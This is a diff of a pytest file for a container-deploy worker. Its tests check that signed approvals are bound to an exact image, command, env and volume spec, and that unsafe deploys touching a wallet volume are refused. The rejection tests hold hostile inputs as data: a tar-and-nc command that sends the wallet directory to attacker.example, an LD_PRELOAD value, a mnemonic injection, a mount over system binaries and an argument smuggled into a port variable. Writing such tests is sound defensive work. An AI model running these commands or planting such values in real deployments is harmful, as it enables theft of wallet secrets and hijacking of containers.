@@ -13,6 +13,7 @@ from __future__ import annotations
 
 import asyncio
 import os
+import re
 from contextlib import asynccontextmanager
 from unittest.mock import AsyncMock, MagicMock, patch
 
@@ -289,6 +290,16 @@ def _error(resp):
     return detail.get("error") if isinstance(detail, dict) else detail
 
 
+def _approve(slug, body, key=WORKER_KEY):
+    """``body`` with an approval signed for exactly it, as the UI would send it."""
+    target = step_up.deploy_target(slug, body["image"], body.get("command"), body.get("env"), body.get("volumes"))
+    return {**body, "approval": step_up.sign(key, step_up.ACTION_CUSTOM_IMAGE, target)}
+
+
+WALLET_MOUNT = {"proxybase-data": {"bind": "/home/proxybase/.proxybase"}}
+PROXYBASE_COMMAND = catalog.get_service("proxybase-xyz")["docker"]["command"]
+
+
 class TestTheWorkerRefuses:
     def test_another_image_mounting_the_wallet(self, worker):
         """The raw command route's attack: any slug, any image, the wallet volume."""
@@ -336,28 +347,77 @@ class TestTheWorkerRefuses:
         assert resp.status_code == 403 and _error(resp) == "step_up_required"
 
     def test_an_approval_for_another_image(self, worker):
-        token = step_up.sign(WORKER_KEY, step_up.ACTION_CUSTOM_IMAGE, "proxybase-xyz|mirror/proxybase:1")
+        token = _approve("proxybase-xyz", {"image": "mirror/proxybase:1"})["approval"]
         resp = worker("/api/containers/proxybase-xyz/deploy", {"image": "attacker/x:1", "approval": token})
         assert resp.status_code == 403 and _error(resp) == "step_up_rejected"
         assert worker.deployed == []
 
     def test_an_approval_signed_with_the_shared_key(self, worker):
-        token = step_up.sign("wk-test", step_up.ACTION_CUSTOM_IMAGE, "proxybase-xyz|mirror/proxybase:1")
-        resp = worker("/api/containers/proxybase-xyz/deploy", {"image": "mirror/proxybase:1", "approval": token})
+        resp = worker(
+            "/api/containers/proxybase-xyz/deploy", _approve("proxybase-xyz", {"image": "mirror/x:1"}, "wk-test")
+        )
         assert resp.status_code == 403 and _error(resp) == "step_up_rejected"
+
+    @pytest.mark.parametrize(
+        "change",
+        [
+            # The review's attack: the catalog's own image, a shell as its command.
+            {"command": "sh -c 'tar c /home/proxybase | nc attacker.example 4444'"},
+            # No command at all runs the image's default, which is not the catalog's.
+            {"command": None},
+            # An env key the catalog does not declare: an import variable or a preload.
+            {"env": {"MASTER_MNEMONIC": "attacker words"}},
+            {"env": {"LD_PRELOAD": "/home/proxybase/.proxybase/x.so"}},
+            # A volume of the caller's mounted over the image's binaries.
+            {"volumes": {**WALLET_MOUNT, "evil-bin": {"bind": "/usr/local/bin"}}},
+        ],
+        ids=["shell-command", "no-command", "import-env", "preload-env", "mount-over-binaries"],
+    )
+    def test_the_catalog_image_doing_something_else(self, worker, change):
+        body = {"image": PROXYBASE_IMAGE, "command": PROXYBASE_COMMAND, "volumes": WALLET_MOUNT, **change}
+        resp = worker("/api/containers/proxybase-xyz/deploy", body)
+        assert resp.status_code == 403 and _error(resp) == "step_up_required", resp.text
+        assert worker.deployed == []
+
+    def test_an_approval_does_not_carry_a_different_command(self, worker):
+        """Bound to the exact spec: confirming one image is not confirming a shell on the wallet."""
+        approved = _approve("proxybase-xyz", {"image": "mirror/proxybase:1", "command": PROXYBASE_COMMAND})
+        resp = worker("/api/containers/proxybase-xyz/deploy", {**approved, "command": "sh -c 'cat /w'"})
+        assert resp.status_code == 403 and _error(resp) == "step_up_rejected"
+        assert worker.deployed == []
+
+    @pytest.mark.parametrize("slug", sorted(orchestrator.critical_slugs()))
+    def test_every_critical_service_with_a_shell_command(self, worker, slug):
+        image = catalog.get_service(slug)["docker"]["image"]
+        resp = worker(f"/api/containers/{slug}/deploy", {"image": image, "command": "sh -c 'id'"})
+        assert resp.status_code == 403 and _error(resp) == "step_up_required", resp.text
+
+    def test_a_value_that_adds_arguments_to_the_command(self):
+        """Mysterium's UDP_PORTS lands on its command line; a space in it must not add a flag."""
+        docker = catalog.get_service("mysterium")["docker"]
+        env = {"UI_ADDRESS": "127.0.0.1", "UDP_PORTS": "10000:10100 --tequilapi.address=0.0.0.0"}
+        command = docker["command"].replace("${UDP_PORTS}", env["UDP_PORTS"])
+        found = orchestrator.critical_spec_deviations("mysterium", docker["image"], command, env, {})
+        assert found == ["the command is not the catalog's"]
+
+    def test_a_skewed_pin_says_to_update_the_worker(self, worker):
+        """A UI on a newer release than this worker: the message names the real cause."""
+        image = PROXYBASE_IMAGE.split("@")[0] + "@sha256:" + "0" * 64
+        resp = worker("/api/containers/proxybase-xyz/deploy", {"image": image, "command": PROXYBASE_COMMAND})
+        assert resp.status_code == 403 and _error(resp) == "step_up_required"
+        assert "update the worker" in resp.json()["detail"]["message"]
 
 
 class TestTheWorkerAllows:
     def test_the_wallet_service_on_its_catalog_image(self, worker):
         resp = worker(
             "/api/containers/proxybase-xyz/deploy",
-            {"image": PROXYBASE_IMAGE, "volumes": {"proxybase-data": {"bind": "/home/proxybase/.proxybase"}}},
+            {"image": PROXYBASE_IMAGE, "command": PROXYBASE_COMMAND, "volumes": WALLET_MOUNT},
         )
         assert resp.status_code == 200, resp.text
 
     def test_a_confirmed_custom_image_once(self, worker):
-        token = step_up.sign(WORKER_KEY, step_up.ACTION_CUSTOM_IMAGE, "proxybase-xyz|mirror/proxybase:1")
-        body = {"image": "mirror/proxybase:1", "approval": token}
+        body = _approve("proxybase-xyz", {"image": "mirror/proxybase:1", "volumes": WALLET_MOUNT})
         assert worker("/api/containers/proxybase-xyz/deploy", body).status_code == 200
         replay = worker("/api/containers/proxybase-xyz/deploy", body)
         assert replay.status_code == 403 and "already used" in replay.text
@@ -376,13 +436,21 @@ def _catalog_deploys():
 
 @pytest.mark.parametrize(("slug", "image"), list(_catalog_deploys()))
 def test_every_catalog_service_still_deploys_on_its_catalog_image(slug, image):
-    """The rule must not refuse a normal deploy of anything in the catalog."""
-    worker_api._validate_critical_image(worker_api.DeploySpec(image=image), slug)
+    """The rule must not refuse a normal deploy of anything in the catalog, as the UI builds it."""
+    docker = catalog.get_service(slug)["docker"]
+    env = {var["key"]: str(var.get("default") or "x") for var in docker.get("env") or []}
+    if "UDP_PORTS" in env:
+        env["UDP_PORTS"] = "10000:10100"
+    command = re.sub(r"\$\{(\w+)\}", lambda m: env.get(m.group(1), m.group(0)), docker.get("command") or "") or None
     volumes = {}
-    for mapping in catalog.get_service(slug)["docker"].get("volumes") or []:
+    for mapping in docker.get("volumes") or []:
         source, target = str(mapping).split(":")[:2]
-        if not source.startswith("$"):
-            volumes[source] = {"bind": target}
+        if source.startswith("$"):
+            source = "/srv/" + slug + target
+        volumes[source] = {"bind": target, "mode": "rw"}
+    spec = worker_api.DeploySpec(image=image, env=env, command=command, volumes=volumes)
+    worker_api._validate_critical_spec(spec, slug)
+    volumes = {source: mount for source, mount in volumes.items() if not source.startswith("/")}
     assert orchestrator.critical_mount_conflicts(slug, volumes, _docker()) == []
 
 
@@ -423,8 +491,8 @@ def _ui_deploy(image, password, user, *, owner_hash=None):
     sent: list[dict] = []
     saved = AsyncMock()
 
-    async def capture(worker_id, slug, spec):
-        sent.append(dict(spec))
+    async def capture(worker_id, method, path, *, json=None, **kwargs):
+        sent.append(dict(json))
         return {"container_id": "abc"}
 
     body = main.DeployRequest(env={"TOKEN": "t"}, image=image, step_up_password=password)
@@ -438,7 +506,7 @@ def _ui_deploy(image, password, user, *, owner_hash=None):
             patch.object(auth, "get_current_user", return_value=who),
             patch.object(main.catalog, "get_service", return_value=VAULT),
             patch.object(main, "_resolve_worker_id", AsyncMock(return_value=1)),
-            patch.object(main, "_proxy_worker_deploy", capture),
+            patch.object(main, "_proxy_to_worker", capture),
             patch.object(main, "_confirmed_worker_key", AsyncMock(return_value=WORKER_KEY)),
             patch.object(main.database, "get_worker", AsyncMock(return_value={"client_id": "w1"})),
             patch.object(main.database, "get_deployment_spec", AsyncMock(return_value=None)),
@@ -494,13 +562,30 @@ class TestTheUiStepUp:
         )
         assert error is None
         approval = sent[0]["approval"]
-        step_up.check(WORKER_KEY, approval, step_up.ACTION_CUSTOM_IMAGE, "vault-demo|mirror/vault:2")
+        target = step_up.deploy_target(
+            "vault-demo", "mirror/vault:2", sent[0].get("command"), sent[0]["env"], sent[0]["volumes"]
+        )
+        step_up.check(WORKER_KEY, approval, step_up.ACTION_CUSTOM_IMAGE, target)
         assert "approval" not in saved and "step_up_password" not in str(saved)
         assert audit[0]["outcome"] == "confirmed" and audit[0]["target"] == "vault-demo|mirror/vault:2"
 
     def test_the_catalog_image_needs_no_password(self, db):
         sent, _, error, _ = _ui_deploy("", None, OWNER)
         assert error is None and "approval" not in sent[0]
+
+    def test_a_password_on_the_catalog_image_signs_it(self, db):
+        """The retry after a worker on another release refused the UI's catalog image or command."""
+        sent, _, error, audit = _ui_deploy("", "right one!", OWNER, owner_hash=auth.hash_password("right one!"))
+        assert error is None
+        target = step_up.deploy_target(
+            "vault-demo", "vault/demo:1.0", sent[0].get("command"), sent[0]["env"], sent[0]["volumes"]
+        )
+        step_up.check(WORKER_KEY, sent[0]["approval"], step_up.ACTION_CUSTOM_IMAGE, target)
+        assert audit[0]["outcome"] == "confirmed"
+
+    def test_the_admin_api_key_cannot_sign_the_catalog_image_either(self, db):
+        sent, _, error, _ = _ui_deploy("", "anything", API_KEY_USER)
+        assert error.detail["error"] == "step_up_api_key" and sent == []
 
     def test_the_step_up_counts_against_the_login_rate_limit(self, db):
         user = {"uid": 7, "u": "owner", "r": "owner"}
